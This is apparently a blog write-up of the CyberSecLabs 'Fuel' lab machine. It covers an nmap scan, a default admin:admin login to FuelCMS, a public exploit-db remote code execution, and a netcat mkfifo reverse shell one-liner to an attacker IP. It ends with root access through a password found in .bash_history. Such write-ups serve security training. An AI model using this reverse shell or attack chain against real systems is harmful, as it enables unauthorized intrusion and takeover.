---
layout: page
title: Fuel - CyberSecLabs
permalink: /posts/ctf/cyberseclabs/fuel.html
---

# Fuel - CyberSecLabs
----



First things first, lets run our nmap scan.  I use a custom script that scans for ports then passes those open ports to nmap for service enumeration, however you can achieve the same results with the below command.

`nmap -p- -A 172.31.1.28`

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d84799e8-41a0-4f6c-bfb4-d09ce25c4625/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d84799e8-41a0-4f6c-bfb4-d09ce25c4625/Untitled.png)

Lets check out port 80

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/1d4ff7aa-600e-403a-bce6-b2872712c527/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/1d4ff7aa-600e-403a-bce6-b2872712c527/Untitled.png)

Looks like we have FuelCMS here.  According to the robots.txt results from the nmap scan, /fuel is disallowed for serach engines so lets go there and see what we can find.

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/0599241c-6de5-4db5-a7d2-fc4f5ebc02d8/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/0599241c-6de5-4db5-a7d2-fc4f5ebc02d8/Untitled.png)

We have a login, first thing I like to do is try default logins and sure enough **admin:admin** worked.

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f945cfbb-ecfa-4e8a-ae53-b4c64a0d4956/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f945cfbb-ecfa-4e8a-ae53-b4c64a0d4956/Untitled.png)

Nice, after looking around for a while I couldn't figure anything out to exploit this further from the admin panel so I decided to look up some potential exploits for this version and found the following.

[Offensive Security's Exploit Database Archive](https://www.exploit-db.com/exploits/47138)

This is a RCE vuln that sends the malicious url with the command we want to send to the server.  It loops so we can send endless commands as long as we have connection.  It also forwards to a proxy like burp which we could simply remove but I decided to keep during the testing.

I admit, I got stuck on this for a while thinking it wouldn't work, trying to move to a different path thinking this exploit is broken before coming back.  When I first ran the exploit, I first ran **whoami** like this.

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e506c9e1-071a-4c7c-bc96-03c265b8e32b/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e506c9e1-071a-4c7c-bc96-03c265b8e32b/Untitled.png)

So I sent to Repeater and got this response.

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ea1d1ea5-269e-4a99-9090-e7634c3a1ea1/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ea1d1ea5-269e-4a99-9090-e7634c3a1ea1/Untitled.png)

I saw the **systemmoira** and thought yeah they looks like the return to the command I issued.  I then decided to modify the request within burp to issue the command **id**

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ea1d1ea5-269e-4a99-9090-e7634c3a1ea1/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ea1d1ea5-269e-4a99-9090-e7634c3a1ea1/Untitled.png)

But I got the same outcome... Everytime I came back to this exploit, just knowing this was the path onto the machine, but just couldn't get it to work.

Then after just turning intercept off of burp and trying the command I saw the output I needed from the command window

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/3a747222-b422-4870-85cf-453b9d0caa0e/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/3a747222-b422-4870-85cf-453b9d0caa0e/Untitled.png)

Finally!  Now that I ran a few different commands such as **pwd** and **ls -l** and got different results I knew I was on the right track.  Not sure why I was getting weird results through brup but either way I moved on.

I used the netcat reverse shell one liner below to get a shell onto the machine.

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.0.11 1234 >/tmp/f`

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/671de87a-cece-46ee-bbc4-18b935820aed/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/671de87a-cece-46ee-bbc4-18b935820aed/Untitled.png)

Now time to copy over LinPEAS and see what we can find

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b14da16c-c8bf-4e18-9642-a246045c3004/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b14da16c-c8bf-4e18-9642-a246045c3004/Untitled.png)

I found the output of **.bash_history** to be interesting.  We see the password for moira.  I tried a few things such as **sudo -l** but ended up finding that the root password is the same as moira's.  So a simple **su root** is all that is needed.

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b1053b8f-337c-4255-a7cf-f027c52ca478/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b1053b8f-337c-4255-a7cf-f027c52ca478/Untitled.png)
